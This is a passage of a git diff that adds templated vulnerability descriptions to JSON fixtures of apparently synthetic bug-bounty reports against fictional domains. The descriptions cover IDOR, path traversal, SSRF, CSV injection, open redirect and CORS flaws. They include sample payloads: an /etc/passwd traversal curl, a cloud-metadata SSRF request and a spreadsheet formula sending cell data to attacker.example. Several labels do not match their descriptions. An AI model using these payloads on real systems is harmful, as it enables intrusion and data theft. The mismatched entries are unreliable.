         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27851,7 +28060,8 @@
           "offset": "3d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/kanton_arvenfels_amt_fuer_kultur_und_medien_reports.json b/fixtures/reports/kanton_arvenfels_amt_fuer_kultur_und_medien_reports.json
index 510ed46..04b23a9 100644
--- a/fixtures/reports/kanton_arvenfels_amt_fuer_kultur_und_medien_reports.json
+++ b/fixtures/reports/kanton_arvenfels_amt_fuer_kultur_und_medien_reports.json
@@ -41,7 +41,8 @@
           "offset": "3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.arvenfels-kultur.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -149,7 +150,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.arvenfels-kultur.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -309,7 +311,8 @@
           "offset": "5d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.arvenfels-kultur.foo/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -449,7 +452,8 @@
           "offset": "7d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -544,7 +548,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.arvenfels-kultur.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -664,7 +669,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.arvenfels-kultur.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -834,7 +840,8 @@
           "offset": "5d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.arvenfels-kultur.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -946,7 +953,8 @@
           "offset": "1d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.arvenfels-kultur.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1076,7 +1084,8 @@
           "offset": "2d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1232,7 +1241,8 @@
           "offset": "6d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.arvenfels-kultur.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1335,7 +1345,8 @@
           "offset": "2d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.arvenfels-kultur.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1475,7 +1486,8 @@
           "offset": "15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.arvenfels-kultur.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1599,7 +1611,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1711,7 +1724,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1810,7 +1824,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1914,7 +1929,8 @@
           "offset": "2d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.arvenfels-kultur.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2015,7 +2031,8 @@
           "offset": "10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2110,7 +2127,8 @@
           "offset": "1d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.arvenfels-kultur.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2239,7 +2257,8 @@
           "offset": "5d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2354,7 +2373,8 @@
           "offset": "5d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2467,7 +2487,8 @@
           "offset": "1d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.arvenfels-kultur.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2607,7 +2628,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.arvenfels-kultur.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2729,7 +2751,8 @@
           "offset": "3d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2867,7 +2890,8 @@
           "offset": "7d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3003,7 +3027,8 @@
           "offset": "5d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.arvenfels-kultur.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3143,7 +3168,8 @@
           "offset": "2d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.arvenfels-kultur.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3249,7 +3275,8 @@
           "offset": "13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.arvenfels-kultur.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3369,7 +3396,8 @@
           "offset": "4d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.arvenfels-kultur.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3485,7 +3513,8 @@
           "offset": "1d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.arvenfels-kultur.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3644,7 +3673,8 @@
           "offset": "7d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
